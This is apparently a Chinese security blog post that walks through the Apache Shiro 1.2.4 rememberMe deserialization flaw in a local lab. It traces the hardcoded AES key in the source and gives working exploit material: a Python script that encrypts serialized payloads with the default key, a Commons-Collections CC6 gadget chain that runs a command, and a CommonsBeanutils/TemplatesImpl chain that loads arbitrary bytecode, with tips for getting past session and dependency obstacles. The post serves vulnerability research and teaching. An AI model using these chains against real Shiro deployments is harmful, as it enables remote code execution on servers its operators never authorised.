---
title: Shiro反序列化漏洞
author: patrik
tags:
  - Java安全
categories:
  - "安全\U0001F510"
top: 20
abbrlink: 950ba293
date: 2024-01-15 17:00:00
---

## 环境搭建

### 下载源码

```bash
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.2.4
```

修改shiro/samples/web目录下的```pom.xml``` 中```jstl版本为1.2```后更新maven

![CleanShot2023-11-16at14.55.32@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at14.55.32@2x.png)

### 部署tomcat

（这里我权限不足 给上级目录更改了下权限）

```
sudo chmod -R 777 tomcat
```

![CleanShot2023-11-16at15.22.15@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at15.22.15@2x.png)



## 漏洞分析

### Cookie

到登录页面登录并勾选```Remember Me```burp抓个包看看

![CleanShot2023-11-16at15.27.41@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot 2023-11-16 at 15.27.41@2x.png)

请求后会返回Cookie

![CleanShot2023-11-16at16.10.42@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.10.42@2x.png)

并在后续请求中也会带上这个Cookie

![CleanShot2023-11-16at16.12.05@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.12.05@2x.png)

### 静态分析源码

IDEA中```Shift+Shift```搜索Shiro包中的和cookie相关的类```CookieRememberMeManager.java```

发现两个函数

![CleanShot2023-11-16at16.18.48@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.18.48@2x.png)

![CleanShot2023-11-16at16.19.44@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.19.44@2x.png)

找一下哪里调用了```getRememberedSerializedIdentity```

将字节转化为认证信息

![image-20231116163211884](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231116163211884.png)

解密+反序列化

![CleanShot2023-11-16at16.33.22@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.33.22@2x.png)

跟一下反序列化函数```deserialize```

![CleanShot2023-11-16at16.35.13@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.35.13@2x.png)

![CleanShot2023-11-16at16.35.47@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.35.47@2x.png)

![image-20231116163712527](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231116163712527.png)

发现调取了原生的反序列化

![CleanShot2023-11-16at16.37.40@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.37.40@2x.png)

再回到```AbstractRememberMeManager.java```跟进一下解密函数```decrypt```

![CleanShot2023-11-16at16.40.36@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.40.36@2x.png)

![CleanShot2023-11-16at16.41.11@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.41.11@2x.png)

用Key解密的 应该为对称加密

![CleanShot2023-11-16at16.42.53@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.42.53@2x.png)

回到解密函数

![CleanShot2023-11-16at16.46.41@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.46.41@2x.png)

![CleanShot2023-11-16at16.47.55@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.47.55@2x.png)

看```decryptionCipherKey```是在哪赋值的

![CleanShot2023-11-16at16.50.11@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.50.11@2x.png)

![CleanShot2023-11-16at16.52.27@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.52.27@2x.png)

![CleanShot2023-11-16at16.53.38@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.53.38@2x.png)

发现常量```DEFAULT_CIPHER_KEY_BYTES```跟进后发现为固定的值 且算法为AES

![CleanShot2023-11-16at16.56.04@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.56.04@2x.png)

也就是说：**在Shiro1.2.4版本，于```RememberMe```功能相关的加密```使用固定的key加密```，且加密算法为```AES算法```。**

## 漏洞利用

### JDK内置链打法

#### 为什么不用CC链

```Shiro```自带的依赖里好像有```CC```

![CleanShot2023-11-17at10.16.30@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.16.30@2x.png)

但用插件看下发现有很多依赖库都是[Test] 实际只能用[compile]和[runtime]

![CleanShot2023-11-17at10.19.49@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.19.49@2x.png)

所以直接用```CC```打是打不了的，这里可以用```commons-beanutils```来打（先不打）

![CleanShot2023-11-17at10.22.45@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.22.45@2x.png)

#### 构造payload

先用Shiro原生的打，使用```URLDNS```序列化生成```ser.bin```

![CleanShot2023-11-17at10.58.14@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.58.14@2x.png)

拷贝进脚本同目录

![CleanShot2023-11-17at12.21.57@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.21.57@2x.png)

加密脚本exp.py

```python
import sys
import base64
import uuid
from random import Random
from Crypto.Cipher import AES

def get_file_data(filename):
    with open(filename,'rb') as f:
        data = f.read()
    return data

def aes_enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
    return ciphertext

def aes_dec(enc_data):
    enc_data = base64.b64decode(enc_data)
    unpad = lambda s: s[:-s[-1]]
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = enc_data[:16]
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    plaintxt = encryptor.decrypt(enc_data[16:])
    #plaintxt = bytes.decode(plaintxt)
    plaintxt = unpad(plaintxt)
    return plaintxt

if __name__ == '__main__':
    data = get_file_data("ser.bin")
    print(aes_enc(data))
```

#### 生成替换密钥

生成密钥

```bash
(shiro_AES_exp) ➜  exp python exp.py
b'TFJpdNMoTaqdUJqGEufEbIpwn5h5mH44sIfGlec5dZveEvXDbFmQed0eXqHQeSpvnOfrFhcYj5+pkkfGWQPEPx00ZjZ4kjgMl4W0vgIJFdkwDbeXRHllxCu2SGqDV1SJInXANAtRevP1IxJt2pACT42W/gqSNi6BRduOCblG47xn0YeT/KOSgULNjVZ1PoaWfHVbndkKonQhfRbhZgYJIIZ7IprRscHGfJC20g2VMnB+OYeCHPp2GQWt4cJWc3Lh26HHWna8yWhPV2RdM8C/y6ZIHKbSVqlZynX3jQ3+ncgm6spKutyOJiRhtU3EJivebfecc0U/TQh7ajbKLWccNfEiEYdIjnjqr2y3afOXzFBlhJayLIOOWLXBFUnGFY5qMlrY9R0bAfZzB9TYaM8tWy+YOyG+bIgMLIcbb3hTxvabvEnRAknFx5P8B880f8nujoJdelu2+eSY1MNcNjntz+O/FMWcbtXr81ioPQn7HlbsQMfRDKGoLFyLW6zd6eZd'
```

```
TFJpdNMoTaqdUJqGEufEbIpwn5h5mH44sIfGlec5dZveEvXDbFmQed0eXqHQeSpvnOfrFhcYj5+pkkfGWQPEPx00ZjZ4kjgMl4W0vgIJFdkwDbeXRHllxCu2SGqDV1SJInXANAtRevP1IxJt2pACT42W/gqSNi6BRduOCblG47xn0YeT/KOSgULNjVZ1PoaWfHVbndkKonQhfRbhZgYJIIZ7IprRscHGfJC20g2VMnB+OYeCHPp2GQWt4cJWc3Lh26HHWna8yWhPV2RdM8C/y6ZIHKbSVqlZynX3jQ3+ncgm6spKutyOJiRhtU3EJivebfecc0U/TQh7ajbKLWccNfEiEYdIjnjqr2y3afOXzFBlhJayLIOOWLXBFUnGFY5qMlrY9R0bAfZzB9TYaM8tWy+YOyG+bIgMLIcbb3hTxvabvEnRAknFx5P8B880f8nujoJdelu2+eSY1MNcNjntz+O/FMWcbtXr81ioPQn7HlbsQMfRDKGoLFyLW6zd6eZd
```





```Cookie```内包含两个身份验证的参数 分别为```JSESSIONID```和```rememberMe```

在身份验证时的逻辑为：优先验证```JSESSIONID```，若存在则不会读取```rememberMe```

故：只替换修改请求包中的```rememberMe```的值，如图无法向下进行反序列化

![CleanShot2023-11-17at12.32.11@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.32.11@2x.png)

所以在替换```rememberMe```的值的同时，还需删除```JSESSIONID```，才能够保证反序列化正常执行

![CleanShot2023-11-17at12.35.01@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.35.01@2x.png)

根据回显可知成功调用反序列化

![CleanShot2023-11-17at12.41.07@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.41.07@2x.png)



#### 动态分析源码

![CleanShot2023-11-17at12.49.07@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.49.07@2x.png)

![CleanShot2023-11-17at12.50.16@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.50.16@2x.png)

![CleanShot2023-11-17at12.51.03@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.51.03@2x.png)

![CleanShot2023-11-17at12.51.42@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.51.42@2x.png)

![image-20231117125300358](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117125300358.png)

![image-20231117125403766](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117125403766.png)

重新提交一次数据包 发现停在断点处

![CleanShot2023-11-17at13.00.49@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.00.49@2x.png)

![CleanShot2023-11-17at13.02.16@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.02.16@2x.png)

接下来会调取```HashMap```

![image-20231117130548805](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117130548805.png)

![CleanShot2023-11-17at13.08.55@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.08.55@2x.png)

![CleanShot2023-11-17at13.10.15@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.10.15@2x.png)

### CC链的利用
因为Shiro内置不带CC依赖，这里先添加上CC3
```xml
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
```
![CleanShot2023-11-17at15.06.51@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.06.51@2x.png)

直接先用```cc6```生成```ser.bin```生成```RememberMe```值做请求
![CleanShot2023-11-17at15.18.11@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.18.11@2x.png)

![CleanShot2023-11-17at15.27.14@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.27.14@2x.png)

![CleanShot2023-11-17at15.40.13@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.40.13@2x.png)

看下```ClassResolvingObjectInputStream```内是如何定义的

发现重写了一个```resolveClass```(是一个用于在对象反序列化过程中进行类解析的方法,该方法属于 ObjectInputStream 类的内部类 ObjectStreamClass)，在重写后则会调用重写的这个```resolveClass```方法

对比一下重写前后

![CleanShot2023-11-17at16.14.20@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.14.20@2x.png)

![CleanShot2023-11-17at16.15.00@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.15.00@2x.png)

![CleanShot2023-11-17at16.18.44@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.18.44@2x.png)

若想成功利用，需解决```加载不到这个数组类```的问题，所以要不出现数组（**在此不详述：为什么加载不了？与tomcat类加载机制有关**）

![CleanShot2023-11-17at16.21.10@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.21.10@2x.png)

结合之前```CC1-CC7```链的学习 如何在```不出现Transformer数组的前提下```拼接一条可利用的链

不能走``Runtime.exec()``，因为无法避免要用到数组

![CleanShot2023-11-17at16.26.35@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.26.35@2x.png)

可以使用之前```CC2```的后半段（不会出现数组类） 但前半段不能使用

![CleanShot2023-11-17at16.29.59@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.29.59@2x.png)

可以拼接```CC2+CC3+CC6```(CC6可以控制输入)

动态加载类<--TemplatesImpl.newTransformer<--invokerTransformer



HashMap.readObject-->TiedMapEntry.get-->LazyMap.get-->invokerTransformer-->Templateslmpl.
newTransformer-->动态加载类

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class cc6Test {
    public static void main(String[] args) throws Exception {


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        HashMap<Object, Object> map = new HashMap<>();
        //put时调用无用的transformer
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");
        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        //删除key
        lazyMap.remove("aaa");


        //通过反射修改lazyMap的factory属性为chainedTransformer
        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chainedTransformer);


        serialize(map2);
        //unserialize("ser.bin");

    }
    public static void serialize (Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize (String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

执行序列化生成```ser.bin``` 并复制替换到exp.py目录下生成新的exp

![CleanShot2023-11-17at16.48.12@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.48.12@2x.png)

![CleanShot2023-11-17at16.51.10@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.51.10@2x.png)

忽略断点后提交请求 成功执行命令

![CleanShot2023-11-17at16.50.23@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.50.23@2x.png)

### CB链的利用

删除pom.xml里的```commons-collections```依赖

![CleanShot2023-11-20at09.59.11@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-20at09.59.11@2x.png)

在ShiroExp项目pom.xml内添加与web项目版本一致的CB依赖
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240104112020212.png)
```commons-beanutils```的定义

Person.java
```java
package org.example;  
  
public class Person {  
  
private String name;  
private int age;  
  
public Person(String name, int age) {  
this.name = name;  
this.age = age;  
}  
  
public String getName() { return name; }  
  
public void setName(String name) { this.name = name; }  
  
public int getAge() { return age; }  
  
public void setAge(int age) { this.age = age; }  
  
}
```
BeanTest.java
```java
package org.example;  
  
import org.apache.commons.beanutils.PropertyUtils;  
  
public class BeanTest {  
public static void main(String[] args) throws Exception {  
Person person = new Person("aaa",18);  
//System.out.println(person.getName());  
System.out.println(PropertyUtils.getProperty(person,"name"));  
System.out.println(PropertyUtils.getProperty(person,"age"));  
//PropertyUtils.getProperty(template,"outputProperties");  
}  
}
```
加断点分析
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115101937341.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102026802.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102136143.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102323885.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102624084.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103019443.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103051026.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103129700.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103255828.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103339819.png)
回想CC3时的TemplatesImpl类的getOutputProperties方法调用了newTransformer
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115104045878.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115104158415.png)
且getOutputProperties的命名格式符合JavaBean的
尝试一下
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115105558675.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115105943229.png)
修改调整一下
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125323686.png)


![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115124713204.png)
这里的Compare是可以利用的
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125654628.png)
回忆之前的CC2里的优先队列里用到的Compare
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125934644.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130145666.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130232812.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130334270.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130402005.png)
回到CC2 
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130523583.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130651736.png)

链：通过CC2的优先队列找到Compare 且优先队列的值也是可以控制的
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130848555.png)
```java
package org.example;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;  
import com.sun.org.apache.xml.internal.serializer.OutputPropertyUtils;  
import org.apache.commons.beanutils.BeanComparator;  
import org.apache.commons.beanutils.PropertyUtils;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class ShiroCB {  
public static void main(String[] args) throws Exception {  
//CC3  
TemplatesImpl templates = new TemplatesImpl();  
Class tc = templates.getClass();  
Field nameField = tc.getDeclaredField("_name");  
nameField.setAccessible(true);  
nameField.set(templates, "aaa");  
Field bytecodesField = tc.getDeclaredField("_bytecodes");  
bytecodesField.setAccessible(true);  
  
byte [] code = Files.readAllBytes(Paths.get("/Users/patrik/Desktop/tmp/Test.class"));  
byte [][] codes = {code};  
bytecodesField.set(templates,codes);  
  
//CB  
BeanComparator beanComparator = new BeanComparator("outputProperties",new AttrCompare());  
  
//CC2  
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));  
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);  
  
priorityQueue.add(templates);  
priorityQueue.add(2);  
  
Class<PriorityQueue> c = PriorityQueue.class;  
Field comparatorField = c.getDeclaredField("comparator");  
comparatorField.setAccessible(true);  
comparatorField.set(priorityQueue, beanComparator);  
  
serialize(priorityQueue);  
//unserialize("ser.bin");  
}  
public static void serialize (Object obj) throws IOException {  
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
oos.writeObject(obj);  
}  
public static Object unserialize (String Filename) throws IOException, ClassNotFoundException {  
ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
Object obj = ois.readObject();  
return obj;  
}  
  
}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115142654347.png)
生成密钥
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143039757.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143159203.png)

## 补充
### 补充1:CB默认依赖CC依赖的问题
没打成功看日志发现CC下的ComparableComparator
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144508222.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144719277.png)
BeanComparator在构造时传入了ComparableComparator
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144850501.png)
用到了CC里的依赖 而CB没有
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115145000272.png)
解决：ComparableComparator的另一个构造函数 可以自己传一个CB或JDK里有的comparator即可
即需同时继承Comparator接口和Serializable接口

```python
with open('comparator.txt') as f:
	data = f.readline()
	coms = []
	while data:
		coms.append(data)
		data = f.readline()

with open('serializable.txt') as d:
	data = d.readline()
	sers = []
	while data:
		sers.append(data)
		data = d.readline()

print(*[i for i in coms if i in sers])

```

![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115150009491.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115150045066.png)
添加即可

### 补充2:用ysoserial打 依赖库版本不同报错
ysoserial的CB依赖版本
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143859811.png)
环境本身的CB依赖
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144005508.png)
CB依赖版本不一致导致报错
因事先指定版本与环境版本一致 所以能打成功
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144128303.png)





























